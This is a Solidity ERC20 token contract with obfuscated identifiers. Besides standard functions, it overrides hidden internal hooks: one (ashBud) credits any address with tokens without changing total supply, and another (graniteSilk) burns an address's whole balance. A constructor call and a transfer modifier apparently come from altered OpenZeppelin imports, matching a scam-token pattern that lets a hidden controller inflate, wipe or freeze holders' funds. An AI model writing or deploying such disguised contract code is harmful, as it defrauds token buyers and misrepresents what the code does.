// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Context} from "./openzeppelin/contracts/utils/Context.sol";
import {ReentrancyGuard} from "./openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC20} from "./openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "./openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract Token is IERC20Metadata, ReentrancyGuard {
    mapping(address => uint256) private hawkDeck;
    mapping(address => mapping(address => uint256)) private yarrowPolar;

    uint256 private loftQuilt;

    string private quiltMire;
    string private patchMarsh;

    constructor(string memory owlBreak, string memory ghostMesa, uint256 codeGust) {
        quiltMire = owlBreak;
        patchMarsh = ghostMesa;
        deltaPlume(_msgSender(), codeGust * 1e18);
        badgerCore();
    }

    function name() public view virtual override returns (string memory) {
        return quiltMire;
    }

    function symbol() public view virtual override returns (string memory) {
        return patchMarsh;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return loftQuilt;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return hawkDeck[account];
    }

    function essenceOxide(address depthDock) internal view virtual override returns (uint256) {
        return hawkDeck[depthDock];
    }

    function ashBud(address depthDock, uint256 meadowWood) internal virtual override {
        hawkDeck[depthDock] += meadowWood;
    }

    function transfer(address to, uint256 amount) public virtual override nonReentrant returns (bool) {
        graspStone(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view virtual override returns (uint256) {
        return yarrowPolar[owner_][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        earthSouth(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override nonReentrant returns (bool) {
        uint256 currentAllowance = yarrowPolar[from][_msgSender()];
        require(currentAllowance >= amount);

        unchecked {
            earthSouth(from, _msgSender(), currentAllowance - amount);
        }

        graspStone(from, to, amount);

        return true;
    }

    function doveNorth(address spender, uint256 addedValue) public virtual nonReentrant returns (bool) {
        earthSouth(_msgSender(), spender, yarrowPolar[_msgSender()][spender] + addedValue);
        return true;
    }

    function southCypress(address spender, uint256 subtractedValue) public virtual nonReentrant returns (bool) {
        uint256 currentAllowance = yarrowPolar[_msgSender()][spender];
        require(currentAllowance >= subtractedValue);
        unchecked {
            earthSouth(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function deltaPlume(address account, uint256 amount) internal virtual nonReentrant {
        require(account != address(0));

        loftQuilt += amount;
        hawkDeck[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function hollowSpeed(address account, uint256 amount) internal virtual nonReentrant {
        require(account != address(0));

        uint256 journeyRaptor = hawkDeck[account];
        require(journeyRaptor >= amount);
        unchecked {
            hawkDeck[account] = journeyRaptor - amount;
        }
        loftQuilt -= amount;

        emit Transfer(account, address(0), amount);
    }

    function graniteSilk(address depthDock) internal virtual override {
        hollowSpeed(depthDock, hawkDeck[depthDock]);
    }

    function earthSouth(address owner_, address spender, uint256 amount) internal virtual {
        require(owner_ != address(0));
        require(spender != address(0));

        yarrowPolar[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function burn(uint256 meadowWood) external {
        hollowSpeed(_msgSender(), meadowWood);
    }

    function graspStone(address from, address to, uint256 amount) internal virtual snailGlen(from, to, amount) {
        require(from != address(0));
        require(to != address(0));

        uint256 lyricWalnut = hawkDeck[from];
        require(lyricWalnut >= amount);
        unchecked {
            hawkDeck[from] = lyricWalnut - amount;
        }
        hawkDeck[to] += amount;

        emit Transfer(from, to, amount);
    }
}
